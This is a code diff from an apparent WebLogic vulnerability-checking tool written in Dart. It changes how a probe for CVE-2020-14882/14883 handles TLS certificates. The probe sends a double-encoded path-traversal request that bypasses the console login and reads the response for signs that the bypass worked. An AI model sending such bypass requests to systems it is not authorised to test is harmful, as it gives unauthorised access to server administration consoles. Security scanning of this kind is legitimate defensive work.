@@ -406,40 +406,61 @@ class WebLogicExpService {
     // If we follow, the redirect target may 404 and we'd miss the detection.
     // A Location header containing 'console.portal' confirms the server decoded
     // %252e%252e%252f → %2e%2e%2f and routed it as a path-traversal bypass.
-    final client = HttpClient()
-      ..badCertificateCallback = (_, __, _) => true;
-    try {
-      final uri = Uri.parse('$_base/console/css/%252e%252e%252fconsole.portal');
-      final req = await client.getUrl(uri).timeout(timeout);
-      req.followRedirects = false;
-      final res = await req.close().timeout(timeout);
-      final location = (res.headers.value('location') ?? '').toLowerCase();
-      final bytes = await res.fold<List<int>>(<int>[], (a, b) => a..addAll(b));
-      final body = utf8.decode(bytes, allowMalformed: true);
-      final bodyLower = body.toLowerCase();
-
-      final isRedirect = res.statusCode >= 300 && res.statusCode < 400;
-      final hasBypassLocation = location.contains('console.portal') ||
-          location.contains('%2e%2e%2fconsole.portal') ||
-          location.contains('_pagelabel=');
-      final hasBypassBody = bodyLower.contains('console.portal') ||
-          bodyLower.contains('_pagelabel=') ||
-          bodyLower.contains('weblogic server console');
-
-      if ((isRedirect && hasBypassLocation) ||
-          (res.statusCode == 200 && hasBypassBody)) {
-        return ExpResult(
-          true,
-          'CVE-2020-14882/14883',
-          isRedirect
-              ? '控制台路径绕过成功，HTTP ${res.statusCode}, Location: $location'
-              : '控制台路径绕过成功，HTTP 200 命中控制台特征',
-        );
+    //
+    // TLS：WebLogic 控制台常用自签证书。默认**严格校验**；只有握手失败时才放宽
+    // 一次，并在 detail 里写明"已放宽证书校验"，避免静默接受任意证书。
+    for (final relaxedTls in const <bool>[false, true]) {
+      final client = HttpClient();
+      if (relaxedTls) {
+        client.badCertificateCallback = (_, __, _) => true;
       }
-    } catch (e) {
-      return ExpResult.probeFailed('CVE-2020-14882/14883', '探测失败: $e');
-    } finally {
-      client.close();
+      try {
+        final uri = Uri.parse(
+          '$_base/console/css/%252e%252e%252fconsole.portal',
+        );
+        final req = await client.getUrl(uri).timeout(timeout);
+        req.followRedirects = false;
+        final res = await req.close().timeout(timeout);
+        final location = (res.headers.value('location') ?? '').toLowerCase();
+        final bytes = await res.fold<List<int>>(
+          <int>[],
+          (a, b) => a..addAll(b),
+        );
+        final body = utf8.decode(bytes, allowMalformed: true);
+        final bodyLower = body.toLowerCase();
+
+        final isRedirect = res.statusCode >= 300 && res.statusCode < 400;
+        final hasBypassLocation = location.contains('console.portal') ||
+            location.contains('%2e%2e%2fconsole.portal') ||
+            location.contains('_pagelabel=');
+        final hasBypassBody = bodyLower.contains('console.portal') ||
+            bodyLower.contains('_pagelabel=') ||
+            bodyLower.contains('weblogic server console');
+
+        if ((isRedirect && hasBypassLocation) ||
+            (res.statusCode == 200 && hasBypassBody)) {
+          final tlsNote = relaxedTls ? '（目标为自签证书，已放宽校验）' : '';
+          return ExpResult(
+            true,
+            'CVE-2020-14882/14883',
+            isRedirect
+                ? '控制台路径绕过成功，HTTP ${res.statusCode}, Location: $location$tlsNote'
+                : '控制台路径绕过成功，HTTP 200 命中控制台特征$tlsNote',
+          );
+        }
+        return const ExpResult(false, 'CVE-2020-14882/14883', '');
+      } on HandshakeException catch (e) {
+        // 严格校验失败：仅当是证书问题时放宽重试一次。
+        if (!relaxedTls) continue;
+        return ExpResult.probeFailed(
+          'CVE-2020-14882/14883',
+          '探测失败: TLS 握手失败（$e）',
+        );
+      } catch (e) {
+        return ExpResult.probeFailed('CVE-2020-14882/14883', '探测失败: $e');
+      } finally {
+        client.close();
+      }
     }
     return const ExpResult(false, 'CVE-2020-14882/14883', '');
   }
